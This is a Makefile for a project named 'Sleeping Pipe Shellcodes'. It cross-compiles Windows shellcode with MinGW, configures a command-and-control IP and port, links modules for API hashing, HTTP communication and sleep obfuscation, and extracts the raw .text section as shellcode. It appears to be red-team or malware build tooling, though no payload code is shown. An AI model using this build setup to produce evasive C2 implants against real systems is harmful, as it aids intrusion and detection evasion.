CC = x86_64-w64-mingw32-g++
OBJCOPY = x86_64-w64-mingw32-objcopy

SRC = src/
BIN = bin/

# C2 Configuration from environment variables (with defaults)
C2_IP ?= 127.0.0.1
C2_PORT ?= 8080

# Compiler flags for shellcode
CFLAGS = -Wall -Wextra -std=c++20 -Os -fno-asynchronous-unwind-tables
CFLAGS += -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
CFLAGS += -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS += -ffunction-sections -falign-jumps=1 -w
CFLAGS += -falign-labels=1 -fPIC -fomit-frame-pointer
CFLAGS += -masm=intel -fpermissive
CFLAGS += -fno-exceptions -fno-rtti -fno-unwind-tables
CFLAGS += -nostdlib -e shellcode_main
CFLAGS += -Wl,--no-seh,--enable-stdcall-fixup,-s

# Common source files for all shellcode
COMMON_SRC = $(SRC)api_hashing.cpp $(SRC)utils.cpp $(SRC)memory.cpp $(SRC)http_com.cpp $(SRC)sleep_obfuscation.cpp $(SRC)chkstk_stub.cpp

# Shellcode targets
SHELLCODES = alarm_shellcode com_shellcode file_shellcode pipe_master_shellcode
SHELLCODE_EXES = $(addprefix $(BIN), $(addsuffix .exe, $(SHELLCODES)))
SHELLCODE_BINS = $(addprefix $(BIN), $(addsuffix .bin, $(SHELLCODES)))

.PHONY: all init clean debug shellcode extract loader

# Default linker script for shellcode mode
LINKER_SCRIPT = -Wl,-T,scripts/linker.ld

init:
	@echo "Building Sleeping Pipe Shellcodes"
	@echo ---------------------------------
	@mkdir -p bin
	@mkdir -p scripts

all: init shellcode

# Build test loader
loader: $(BIN)test_loader.exe

$(BIN)test_loader.exe: $(SRC)test_loader.cpp
	@echo "[+] Building shellcode test loader"
	$(CC) -Wall -Wextra -o $@ $<

# Build all shellcode executables
shellcode: $(SHELLCODE_EXES)

# Extract raw shellcode from executables
extract: $(SHELLCODE_BINS)

# Pattern rule to build shellcode executables
$(BIN)%_shellcode.exe: $(SRC)%_shellcode.cpp $(COMMON_SRC)
	@echo "[+] Building $@"
	$(CC) $(CFLAGS) $(DEBUG_FLAG) $(LINKER_SCRIPT) -o $@ $< $(COMMON_SRC)

# Pattern rule to extract shellcode binary
$(BIN)%.bin: $(BIN)%.exe
	@echo "[+] Extracting shellcode from $<"
	$(OBJCOPY) -O binary -j .text $< $@
	@echo "[+] Shellcode saved to $@"
	@wc -c $@

debug: DEBUG_FLAG = -D VERBOSE=4
debug: CFLAGS := $(filter-out -nostdlib -e shellcode_main,$(CFLAGS))
debug: LINKER_SCRIPT =
debug: all

clean:
	@echo "[*] Cleaning build artifacts"
	@rm -f $(BIN)*.exe $(BIN)*.bin
	@echo "[+] Clean complete"
